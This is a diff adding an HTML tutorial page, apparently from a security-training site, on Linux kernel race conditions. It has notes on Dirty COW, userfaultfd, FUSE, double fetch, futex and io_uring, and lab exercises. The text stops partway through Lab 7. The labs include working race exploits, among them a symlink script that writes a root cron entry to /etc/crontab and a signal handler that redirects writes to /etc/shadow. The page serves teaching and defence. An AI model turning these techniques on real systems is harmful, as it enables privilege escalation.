@@ -1,0 +1,1367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Race Conditions</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Kernel Race Conditions</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <h2>Race Condition Fundamentals</h2>
+        <p>A race condition occurs when the correctness of a program depends on the relative timing of concurrent operations. In the kernel, races are especially dangerous because they can violate security assumptions enforced by the kernel itself.</p>
+        <table>
+          <tr><th>Type</th><th>Description</th><th>Example</th></tr>
+          <tr><td><strong>TOCTOU</strong></td><td>Time-of-Check to Time-of-Use — state changes between validation and use</td><td>Check file permissions, then open (file changes between check and open)</td></tr>
+          <tr><td><strong>Data Race</strong></td><td>Concurrent unsynchronized access to shared memory (at least one write)</td><td>Two threads incrementing a counter without locks</td></tr>
+          <tr><td><strong>Atomicity Violation</strong></td><td>A sequence of operations that should be atomic is interrupted</td><td>Read-modify-write on a shared variable without locking</td></tr>
+        </table>
+<pre><code class="language-c">// Classic TOCTOU example in kernel context:
+// Check: verify user pointer is valid (access_ok)
+// Use:   copy_from_user — but user changed the mapping between check and use!
+
+// Another example: double fetch
+if (get_user(len, &amp;user_req-&gt;length))   // first fetch: check
+    return -EFAULT;
+if (len &gt; MAX_SIZE) return -EINVAL;
+copy_from_user(buf, user_req-&gt;data, 
+    user_req-&gt;length);                    // second fetch: use (len may differ!)
+// Another thread changed user_req-&gt;length between the two reads</code></pre>
+
+        <h2>Dirty COW (CVE-2016-5195)</h2>
+        <p>The most famous kernel race condition. A race between <code>madvise(MADV_DONTNEED)</code> and <code>write()</code> to <code>/proc/self/mem</code> allowed overwriting read-only file mappings (Copy-On-Write pages). Existed for ~9 years in the kernel.</p>
+<pre><code class="language-c">// The race:
+// Thread 1: write() to /proc/self/mem at the mmap'd offset
+//   → triggers COW fault → kernel allocates private copy
+//   → BUT there's a window where the page table entry points
+//     to the original (shared, read-only) page WITH write permissions
+//
+// Thread 2: madvise(MADV_DONTNEED) on the same mapping
+//   → discards the private COW copy → reverts to original page
+//   → next write goes to the ORIGINAL page (bypassing COW)
+
+// The bug was in get_user_pages() (GUP) — the retry logic
+// after a COW fault could lose the "this is a COW page" information
+// when the page was discarded by madvise between retries
+
+// Result: write to any file you can read (e.g., /etc/passwd, SUID binaries)</code></pre>
+<pre><code class="language-bash"># Affected: Linux 2.6.22 (2007) through 4.8.3 / 4.7.9 / 4.4.26
+# Fixed by: adding FOLL_COW flag to GUP to track COW state properly
+
+# Detection
+uname -r   # check kernel version
+# PoC typically overwrites /etc/passwd or a SUID binary</code></pre>
+        <p><strong>Pattern:</strong> <code>mmap(target_file, READ)</code> → Thread A: <code>write(/proc/self/mem)</code> → Thread B: <code>madvise(MADV_DONTNEED)</code> → repeat until race hits.</p>
+
+        <h2>Userfaultfd for Race Exploitation</h2>
+        <p><code>userfaultfd</code> provides a <strong>deterministic</strong> way to win kernel races. Instead of spinning in a loop hoping to hit the right timing, you stall the kernel at an exact point by faulting on a userfaultfd-registered page.</p>
+<pre><code class="language-c">// How it works:
+// 1. Register a memory region with userfaultfd
+// 2. When kernel does copy_from_user() on that region → page fault
+// 3. Kernel blocks the faulting thread, notifies userspace handler
+// 4. Handler runs exploit logic (free, reallocate, spray) while kernel waits
+// 5. Handler resolves the fault → kernel resumes with altered state
+
+// Key: the kernel stops *mid-operation* at a precise point
+// This turns probabilistic races into deterministic ones
+
+// Setup:
+int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+struct uffdio_api api = { .api = UFFD_API };
+ioctl(uffd, UFFDIO_API, &amp;api);
+
+// Map a page but don't populate it
+void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+struct uffdio_register reg = {
+    .range = { .start = (unsigned long)page, .len = 0x1000 },
+    .mode = UFFDIO_REGISTER_MODE_MISSING,
+};
+ioctl(uffd, UFFDIO_REGISTER, &amp;reg);
+
+// When kernel accesses `page`, it faults → your handler gets control</code></pre>
+<pre><code class="language-bash"># Check if userfaultfd is available to unprivileged users
+cat /proc/sys/vm/unprivileged_userfaultfd
+# 0 = restricted (most modern kernels)
+# 1 = available to all users</code></pre>
+
+        <h2>FUSE for Race Exploitation</h2>
+        <p><strong>FUSE</strong> (Filesystem in Userspace) provides similar stalling capability as userfaultfd. When the kernel reads from a FUSE-mounted file (e.g., during <code>copy_from_user</code> on an mmap'd FUSE file), the read is handled by a userspace daemon — which can delay arbitrarily.</p>
+<pre><code class="language-c">// FUSE handler stalls on read:
+static int fuse_read(const char *path, char *buf, size_t size,
+                     off_t offset, struct fuse_file_info *fi) {
+    // Kernel is now blocked waiting for us!
+    printf("[*] Kernel stalled on FUSE read, doing exploit work...\n");
+    
+    do_exploit_work();  // free/realloc/spray while kernel waits
+    
+    memcpy(buf, payload_data, size);  // provide data to resume
+    return size;
+}
+
+// Advantage over userfaultfd:
+// - Works even when unprivileged_userfaultfd = 0
+// - Available on most systems (just needs FUSE support)
+// Disadvantage:
+// - More setup overhead (mount filesystem, write FUSE daemon)
+// - Slightly less precise than userfaultfd</code></pre>
+<pre><code class="language-bash"># Mount FUSE filesystem
+mkdir /tmp/fuse_mount
+./exploit_fuse /tmp/fuse_mount &amp;
+
+# The exploit triggers a kernel path that reads from FUSE file:
+# e.g., ioctl(fd, CMD, mmap_of_fuse_file)
+# kernel does copy_from_user → hits FUSE file → calls our handler</code></pre>
+
+        <h2>Double Fetch Vulnerabilities</h2>
+        <p>The kernel reads user memory <strong>twice</strong> — once for validation, once for use. An attacker modifies the memory between fetches.</p>
+<pre><code class="language-c">// Vulnerable pattern:
+static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
+    struct user_request __user *ureq = (void __user *)arg;
+    size_t len;
+
+    get_user(len, &amp;ureq-&gt;length);     // FETCH 1: read length for validation
+    if (len &gt; MAX_BUF) return -EINVAL;
+
+    // *** RACE WINDOW: user thread changes ureq-&gt;length ***
+
+    copy_from_user(kbuf, ureq-&gt;data, 
+        ureq-&gt;length);                 // FETCH 2: reads length AGAIN from user memory
+                                        // → may now be &gt; MAX_BUF → overflow!
+    return 0;
+}
+
+// Fix: copy once, use the kernel copy
+get_user(len, &amp;ureq-&gt;length);
+if (len &gt; MAX_BUF) return -EINVAL;
+copy_from_user(kbuf, ureq-&gt;data, len);  // use kernel-side `len`, not ureq-&gt;length</code></pre>
+
+        <h3>Exploiting Double Fetch</h3>
+<pre><code class="language-c">// Attacker: two threads racing on shared userspace struct
+struct user_request *shared_req = mmap(...);
+
+// Thread 1: keeps flipping the length
+void *flipper(void *arg) {
+    while (racing) {
+        shared_req-&gt;length = SAFE_SIZE;      // passes validation
+        usleep(0);
+        shared_req-&gt;length = OVERFLOW_SIZE;  // causes overflow
+    }
+}
+
+// Thread 2: keeps calling the vulnerable ioctl
+void *caller(void *arg) {
+    while (racing) {
+        ioctl(fd, VULN_CMD, shared_req);
+    }
+}
+
+// Eventually the timing aligns: FETCH 1 reads SAFE_SIZE (passes check),
+// FETCH 2 reads OVERFLOW_SIZE (used for copy)</code></pre>
+
+        <h2>Signal-Based Racing</h2>
+        <p>Use signals (e.g., <code>SIGALRM</code>, <code>SIGUSR1</code>) to interrupt kernel operations at precise moments. When a signal is pending during a syscall, the kernel may restart or abort the operation, creating race windows.</p>
+<pre><code class="language-c">// Using alarm() to interrupt blocking operations
+#include &lt;signal.h&gt;
+
+volatile int alarm_fired = 0;
+void handler(int sig) { alarm_fired = 1; }
+
+signal(SIGALRM, handler);
+alarm(0);  // cancel any pending
+
+// Set up race: alarm fires during a blocking kernel operation
+struct itimerval timer = {
+    .it_value = { .tv_sec = 0, .tv_usec = 1 },  // fire in 1 µs
+    .it_interval = { .tv_sec = 0, .tv_usec = 1 },
+};
+setitimer(ITIMER_REAL, &amp;timer, NULL);
+
+// Now call the vulnerable syscall — signal interrupts it mid-operation
+int ret = syscall_that_races(...);
+// If interrupted at the right moment, kernel state is inconsistent</code></pre>
+
+        <h2>Futex Vulnerabilities</h2>
+        <p>The <code>futex()</code> syscall is complex and has been a recurring source of race conditions. It operates on user-space addresses with kernel-side wait queues — the interaction between user-controlled memory and kernel synchronization creates subtle races.</p>
+<pre><code class="language-c">// futex(2) key operations:
+// FUTEX_WAIT — sleep until *uaddr != val (kernel checks, then sleeps)
+// FUTEX_WAKE — wake N waiters on uaddr
+// FUTEX_REQUEUE — move waiters from one futex to another
+
+// Historical vulnerabilities:
+// CVE-2014-3153 (Towelroot): FUTEX_REQUEUE race
+//   - Requeue from PI futex to non-PI futex
+//   - Race between requeue and wake created dangling pointers
+//   - Used to root many Android devices
+
+// CVE-2014-0205: futex refcount race
+// CVE-2021-3347: PI futex UAF
+
+// The complexity of futex priority inheritance (PI) makes it a
+// rich source of races — PI state tracking spans user and kernel</code></pre>
+
+        <h2>/proc/self/mem Races</h2>
+        <p>Writing to <code>/proc/self/mem</code> bypasses normal memory protection (it calls <code>get_user_pages</code> with force flag). Combined with <code>madvise</code> or other page table manipulation, this creates powerful race primitives.</p>
+<pre><code class="language-c">// /proc/self/mem allows write access to your own virtual memory
+// at arbitrary offsets — even to read-only mmap'd files (temporarily,
+// due to COW). This is the write primitive used in Dirty COW.
+
+int mem_fd = open("/proc/self/mem", O_RDWR);
+
+// Write to a specific virtual address
+lseek(mem_fd, (off_t)target_addr, SEEK_SET);
+write(mem_fd, payload, payload_len);
+
+// The kernel uses get_user_pages(FOLL_FORCE | FOLL_WRITE) internally,
+// which can trigger COW and temporarily grant write access to the
+// underlying page — the race window for Dirty COW</code></pre>
+
+        <h2>Symlink / Hardlink Races</h2>
+        <p>Filesystem race conditions exploit the gap between checking a path and using it. Classic TOCTOU: check that a path is safe, then the attacker replaces it with a symlink to a sensitive file.</p>
+<pre><code class="language-bash"># Classic symlink race:
+# Privileged program does:
+#   1. stat("/tmp/logfile") → checks it's a regular file
+#   2. open("/tmp/logfile", O_WRONLY) → opens it
+
+# Attacker between step 1 and 2:
+rm /tmp/logfile
+ln -s /etc/shadow /tmp/logfile
+# Now the privileged program writes to /etc/shadow!
+
+# In kernel context: modules that resolve paths in /tmp or
+# user-writable directories without O_NOFOLLOW</code></pre>
+<pre><code class="language-c">// Kernel-side mitigation: protected_symlinks
+// /proc/sys/fs/protected_symlinks = 1
+// Prevents following symlinks in sticky directories (like /tmp)
+// unless the owner matches
+
+// Hardlink race: create hardlink to sensitive file
+// /proc/sys/fs/protected_hardlinks = 1
+// Prevents creating hardlinks to files you don't own</code></pre>
+
+        <h2>Race Conditions in SLUB Allocator</h2>
+        <p>SLUB races occur when an object is freed and reallocated between a pointer dereference. The per-CPU freelists in SLUB can create timing-dependent UAF conditions.</p>
+<pre><code class="language-c">// Race-induced UAF in SLUB:
+// Thread 1 (kernel):
+//   ptr = cache-&gt;freelist;  // get pointer to free object
+//   ... scheduling happens ...
+//
+// Thread 2 (attacker):
+//   Triggers free of an adjacent object
+//   Reallocates the slot with controlled data
+//
+// Thread 1 resumes:
+//   Uses ptr → now points to attacker-controlled data
+
+// SLUB's cmpxchg_double for freelist operations is atomic,
+// but complex paths (especially with debugging off) can have windows
+
+// Also: SLUB freelist pointer is stored inside the free object itself
+// If freelist hardening is off (CONFIG_SLAB_FREELIST_HARDENED=n),
+// overwriting a free object's first 8 bytes corrupts the freelist</code></pre>
+
+        <h2>Exploit Reliability and Timing</h2>
+        <table>
+          <tr><th>Technique</th><th>Reliability</th><th>Use Case</th></tr>
+          <tr><td>userfaultfd</td><td>Deterministic (near 100%)</td><td>Stall kernel mid-operation for heap spray/race</td></tr>
+          <tr><td>FUSE</td><td>Deterministic</td><td>Alternative to userfaultfd when restricted</td></tr>
+          <tr><td>CPU pinning</td><td>Improves probability</td><td>Control scheduling to widen race windows</td></tr>
+          <tr><td>Busy-loop racing</td><td>Probabilistic (1–50%)</td><td>Simple races, Dirty COW style</td></tr>
+          <tr><td>Signal-based</td><td>Semi-deterministic</td><td>Interrupt kernel at specific points</td></tr>
+        </table>
+
+        <h3>CPU Pinning for Race Stability</h3>
+<pre><code class="language-c">// Pin threads to specific CPUs to control scheduling
+#define _GNU_SOURCE
+#include &lt;sched.h&gt;
+
+void pin_to_cpu(int cpu) {
+    cpu_set_t set;
+    CPU_ZERO(&amp;set);
+    CPU_SET(cpu, &amp;set);
+    sched_setaffinity(0, sizeof(set), &amp;set);
+}
+
+// Pin racing threads to the SAME CPU → force preemption-based racing
+// Or to DIFFERENT CPUs → true parallelism for SMP races
+
+// Thread 1 (target operation) on CPU 0
+pin_to_cpu(0);
+ioctl(fd, VULN_CMD, arg);
+
+// Thread 2 (racing operation) on CPU 1
+pin_to_cpu(1);
+// race operation here</code></pre>
+<pre><code class="language-bash"># From shell: pin process to CPU
+taskset -c 0 ./exploit_thread1 &amp;
+taskset -c 1 ./exploit_thread2 &amp;
+
+# Check available CPUs
+nproc
+lscpu | grep "CPU(s)"
+
+# In QEMU, control CPU count:
+qemu-system-x86_64 ... -smp 2</code></pre>
+
+        <h2>io_uring Race Conditions</h2>
+        <p><code>io_uring</code> is Linux's async I/O interface. Its complexity (shared ring buffers, kernel worker threads, file registration) has led to numerous race conditions.</p>
+<pre><code class="language-c">// io_uring creates kernel worker threads that process I/O submissions
+// asynchronously. Races arise because:
+// 1. Multiple kernel workers can process requests concurrently
+// 2. File descriptors can be closed while io_uring still references them
+// 3. Registered buffers/files can be modified during in-flight operations
+
+// Common io_uring race patterns:
+// - IORING_OP_CLOSE races with other operations on the same fd
+// - IORING_REGISTER_FILES_UPDATE racing with submission
+// - UAF in io_uring worker thread cleanup
+
+// io_uring is disabled in many hardened environments:
+// /proc/sys/kernel/io_uring_disabled = 1 or 2</code></pre>
+<pre><code class="language-bash"># Check io_uring availability
+cat /proc/sys/kernel/io_uring_disabled
+# 0 = enabled for all
+# 1 = disabled for unprivileged
+# 2 = disabled for all</code></pre>
+
+        <h2>Race Condition Prevention</h2>
+        <table>
+          <tr><th>Mechanism</th><th>Use</th><th>Example</th></tr>
+          <tr><td><strong>Spinlock</strong></td><td>Short critical sections, interrupt context</td><td><code>spin_lock(&amp;lock); ... spin_unlock(&amp;lock);</code></td></tr>
+          <tr><td><strong>Mutex</strong></td><td>Longer critical sections, can sleep</td><td><code>mutex_lock(&amp;mtx); ... mutex_unlock(&amp;mtx);</code></td></tr>
+          <tr><td><strong>RCU</strong></td><td>Read-heavy, lockless reads</td><td><code>rcu_read_lock(); p = rcu_dereference(ptr);</code></td></tr>
+          <tr><td><strong>Atomic ops</strong></td><td>Single variable updates</td><td><code>atomic_inc(&amp;counter); atomic_cmpxchg(...);</code></td></tr>
+          <tr><td><strong>Seqlock</strong></td><td>Rare writes, frequent reads</td><td><code>read_seqbegin(&amp;lock); ... read_seqretry(...);</code></td></tr>
+        </table>
+<pre><code class="language-c">// Key prevention pattern: "copy once, use the copy"
+// Instead of reading user memory multiple times:
+
+// BAD (double fetch):
+get_user(len, &amp;ureq-&gt;length);
+if (len &gt; MAX) return -EINVAL;
+copy_from_user(buf, ureq-&gt;data, ureq-&gt;length);  // reads length AGAIN
+
+// GOOD (single fetch):
+get_user(len, &amp;ureq-&gt;length);
+if (len &gt; MAX) return -EINVAL;
+copy_from_user(buf, ureq-&gt;data, len);  // uses kernel-side copy
+
+// For structs: copy entire struct to kernel first
+struct user_request kreq;
+if (copy_from_user(&amp;kreq, ureq, sizeof(kreq)))
+    return -EFAULT;
+// Now use kreq.field — safe from user modification</code></pre>
+<pre><code class="language-c">// RCU (Read-Copy-Update) — lockless read-side
+// Readers don't take locks, writers copy-then-replace
+
+// Reader:
+rcu_read_lock();
+struct config *cfg = rcu_dereference(global_config);
+use(cfg-&gt;value);  // safe to read, pointer won't be freed until grace period
+rcu_read_unlock();
+
+// Writer:
+struct config *new = kmalloc(sizeof(*new), GFP_KERNEL);
+*new = *old;              // copy
+new-&gt;value = updated;     // update copy
+rcu_assign_pointer(global_config, new);  // publish atomically
+synchronize_rcu();         // wait for all readers to finish
+kfree(old);                // safe to free old version</code></pre>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Basic TOCTOU in Filesystem</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit a TOCTOU vulnerability in a privileged program that checks file ownership before writing. Race with a symlink swap to redirect the write to <code>/etc/crontab</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// vuln_writer.c — runs as root (SUID)
+#include &lt;stdio.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char *argv[]) {
+    struct stat st;
+    stat(argv[1], &amp;st);                  // CHECK: is it owned by caller?
+    if (st.st_uid != getuid()) {
+        printf("Not your file!\n");
+        return 1;
+    }
+    // *** RACE WINDOW: attacker swaps file with symlink ***
+    usleep(100);  // simulated delay (real code has natural delay)
+    FILE *f = fopen(argv[1], "a");        // USE: open and write
+    fprintf(f, "%s\n", argv[2]);
+    fclose(f);
+}</code></pre>
+<pre><code class="language-bash">#!/bin/bash
+# race_exploit.sh — race the TOCTOU window
+TARGET="/tmp/racefile"
+touch "$TARGET"  # owned by us → passes check
+
+# Racer thread: swap file with symlink in a loop
+while true; do
+    rm -f "$TARGET"
+    ln -s /etc/crontab "$TARGET"
+    rm -f "$TARGET"
+    touch "$TARGET"  # restore for next check
+done &amp;
+
+# Caller thread: repeatedly invoke vulnerable program
+for i in $(seq 1 1000); do
+    ./vuln_writer "$TARGET" "* * * * * root /tmp/pwn.sh"
+done
+
+kill %1  # stop racer
+cat /etc/crontab  # check if our line was written</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Dirty COW Analysis</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Study the Dirty COW (CVE-2016-5195) race condition. Set up a vulnerable kernel in QEMU, understand the <code>madvise</code> + <code>/proc/self/mem</code> race, and trace the code path in the kernel source.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Set up vulnerable kernel (pre-4.8.3)
+# Download kernel 4.8.2 source
+wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.8.2.tar.xz
+tar xf linux-4.8.2.tar.xz &amp;&amp; cd linux-4.8.2
+make defconfig &amp;&amp; make -j$(nproc)
+
+# Boot in QEMU
+qemu-system-x86_64 -kernel arch/x86/boot/bzImage \
+    -initrd ../initramfs.cpio.gz -nographic \
+    -append "console=ttyS0" -m 512M</code></pre>
+<pre><code class="language-c">// Dirty COW race structure (analysis — NOT for active exploitation):
+// Thread A: write to /proc/self/mem at mmap offset
+//   → triggers COW: kernel does get_user_pages(FOLL_WRITE)
+//   → kernel breaks COW, allocates private page
+//   → BUT: between retry loops, madvise discards the page
+//
+// Thread B: madvise(addr, len, MADV_DONTNEED)
+//   → discards the private COW page
+//   → next GUP retry finds original read-only page
+//   → race: GUP sees the page as writable (stale PTE state)
+//
+// Study points:
+// - mm/gup.c: follow_page_mask() and faultin_page()
+// - The FOLL_COW fix: added check that COW was properly completed
+// - The retry loop in __get_user_pages() that creates the window</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Userfaultfd Race Setup</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Set up a userfaultfd handler that stalls a kernel <code>copy_from_user</code> call. While stalled, perform a heap operation (free/reallocate) to demonstrate deterministic race control.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Complete userfaultfd race harness
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;poll.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/syscall.h&gt;
+#include &lt;linux/userfaultfd.h&gt;
+
+static int vuln_fd;
+static int uffd;
+
+void *fault_handler(void *arg) {
+    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
+    poll(&amp;pfd, 1, -1);
+
+    struct uffd_msg msg;
+    read(uffd, &amp;msg, sizeof(msg));
+    printf("[*] Page fault at 0x%llx — kernel is stalled!\n",
+           msg.arg.pagefault.address);
+
+    // === EXPLOIT WINDOW: kernel is frozen mid-copy_from_user ===
+    printf("[*] Freeing object while kernel is stalled...\n");
+    ioctl(vuln_fd, IOCTL_FREE, 0);    // free the object
+    printf("[*] Spraying replacement...\n");
+    // spray_replacement();             // reclaim with controlled data
+    // === END WINDOW ===
+
+    // Provide page data to unblock kernel
+    char page_data[0x1000] = {0};
+    struct uffdio_copy uc = {
+        .dst = msg.arg.pagefault.address &amp; ~0xFFFUL,
+        .src = (unsigned long)page_data,
+        .len = 0x1000,
+    };
+    ioctl(uffd, UFFDIO_COPY, &amp;uc);
+    return NULL;
+}
+
+int main() {
+    vuln_fd = open("/dev/vuln", O_RDWR);
+
+    // Setup userfaultfd
+    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
+    struct uffdio_api api = { .api = UFFD_API };
+    ioctl(uffd, UFFDIO_API, &amp;api);
+
+    void *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    struct uffdio_register reg = {
+        .range = { .start = (unsigned long)page, .len = 0x1000 },
+        .mode = UFFDIO_REGISTER_MODE_MISSING,
+    };
+    ioctl(uffd, UFFDIO_REGISTER, &amp;reg);
+
+    // Start handler, trigger vuln ioctl with uffd page
+    pthread_t t;
+    pthread_create(&amp;t, NULL, fault_handler, NULL);
+
+    ioctl(vuln_fd, IOCTL_ALLOC, 0);           // allocate target object
+    ioctl(vuln_fd, IOCTL_COPY_FROM, page);     // copy_from_user → faults!
+    // After unblock: kernel uses the object we freed → UAF
+    ioctl(vuln_fd, IOCTL_USE, 0);
+
+    pthread_join(t, NULL);
+    return 0;
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: FUSE Handler for Kernel Race</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write a FUSE filesystem that stalls on <code>read()</code> to create a race window. Use it as an alternative to userfaultfd when <code>unprivileged_userfaultfd=0</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// fuse_stall.c — FUSE filesystem that stalls reads
+#define FUSE_USE_VERSION 31
+#include &lt;fuse3/fuse.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+
+static volatile int stall_done = 0;
+
+static int stall_getattr(const char *path, struct stat *st,
+                         struct fuse_file_info *fi) {
+    memset(st, 0, sizeof(*st));
+    if (strcmp(path, "/") == 0) {
+        st-&gt;st_mode = S_IFDIR | 0755;
+        st-&gt;st_nlink = 2;
+    } else if (strcmp(path, "/trigger") == 0) {
+        st-&gt;st_mode = S_IFREG | 0644;
+        st-&gt;st_size = 0x1000;
+    }
+    return 0;
+}
+
+static int stall_read(const char *path, char *buf, size_t size,
+                      off_t offset, struct fuse_file_info *fi) {
+    printf("[*] Kernel reading FUSE file — stalling!\n");
+
+    // === RACE WINDOW: do exploit work here ===
+    do_exploit_work();  // free/spray/whatever
+    stall_done = 1;
+    // === END WINDOW ===
+
+    memset(buf, 'A', size);
+    return size;
+}
+
+// Register FUSE operations and mount
+static struct fuse_operations ops = {
+    .getattr = stall_getattr,
+    .read = stall_read,
+};</code></pre>
+<pre><code class="language-bash"># Compile and mount
+gcc -o fuse_stall fuse_stall.c $(pkg-config --cflags --libs fuse3)
+mkdir /tmp/fuse_mnt
+./fuse_stall /tmp/fuse_mnt &amp;
+
+# Now mmap the FUSE file and pass to kernel
+# When kernel does copy_from_user on the mmap'd region → calls stall_read</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: Double Fetch Detection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Identify and exploit a double-fetch vulnerability in a kernel module. Write a multi-threaded program where one thread flips a value in shared memory while the other calls the vulnerable ioctl.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// vuln_double_fetch.c — kernel module
+struct request {
+    size_t length;
+    char data[256];
+};
+
+static long df_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
+    struct request __user *ureq = (void __user *)arg;
+    size_t len;
+    char kbuf[128];
+
+    get_user(len, &amp;ureq-&gt;length);          // fetch 1
+    if (len &gt; sizeof(kbuf)) return -EINVAL;
+
+    // BUG: reads length again from userspace!
+    copy_from_user(kbuf, ureq-&gt;data, ureq-&gt;length);  // fetch 2
+    return 0;
+}</code></pre>
+<pre><code class="language-c">// exploit_df.c — race the double fetch
+#include &lt;pthread.h&gt;
+volatile int racing = 1;
+struct request *shared;
+
+void *flipper(void *arg) {
+    while (racing) {
+        shared-&gt;length = 64;     // safe (passes check)
+        shared-&gt;length = 512;    // overflow (bypasses check)
+    }
+    return NULL;
+}
+
+int main() {
+    shared = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
+                  MAP_SHARED|MAP_ANONYMOUS, -1, 0);
+    shared-&gt;length = 64;
+
+    int fd = open("/dev/double_fetch", O_RDWR);
+    pthread_t t;
+    pthread_create(&amp;t, NULL, flipper, NULL);
+
+    for (int i = 0; i &lt; 100000; i++)
+        ioctl(fd, 0x1337, shared);  // race: fetch1=64, fetch2=512 → overflow!
+
+    racing = 0;
+    pthread_join(t, NULL);
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Signal Race Implementation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use POSIX signals to interrupt a kernel operation at a precise moment. Demonstrate how signal delivery during a syscall can create a race window by altering state in the signal handler.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Signal handler modifies shared state during syscall
+#define _GNU_SOURCE
+#include &lt;signal.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+static volatile int target_fd = -1;
+static char *shared_path;
+
+// Signal handler: runs when SIGALRM fires during blocking syscall
+void race_handler(int sig) {
+    // Swap the file path while the kernel is mid-operation
+    // e.g., replace safe path with symlink to sensitive file
+    unlink(shared_path);
+    symlink("/etc/shadow", shared_path);
+}
+
+int main() {
+    shared_path = "/tmp/race_target";
+
+    // Create a normal file initially
+    int fd = open(shared_path, O_CREAT | O_WRONLY, 0644);
+    write(fd, "safe\n", 5);
+    close(fd);
+
+    // Set up recurring SIGALRM every 1 microsecond
+    signal(SIGALRM, race_handler);
+    struct itimerval itv = {
+        .it_value = { .tv_sec = 0, .tv_usec = 1 },
+        .it_interval = { .tv_sec = 0, .tv_usec = 1 },
+    };
+    setitimer(ITIMER_REAL, &amp;itv, NULL);
+
+    // Vulnerable operation: stat → open (TOCTOU with signal assist)
+    for (int i = 0; i &lt; 100000; i++) {
+        unlink(shared_path);  // restore
+        int tmp = open(shared_path, O_CREAT | O_WRONLY, 0644);
+        close(tmp);
+        // Simulated privileged check-then-use
+        // Signal fires between these operations
+    }
+    return 0;
+}</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Race in SLUB Allocator</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a race condition in a kernel module that frees and uses a SLUB object concurrently. Use two threads — one triggering a free and one triggering a use — to achieve a UAF.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// Module: concurrent access without locking
+// Thread 1 can call FREE, Thread 2 can call USE
+// No mutex protects the shared pointer → race
+
+// exploit_slub_race.c
+#define _GNU_SOURCE
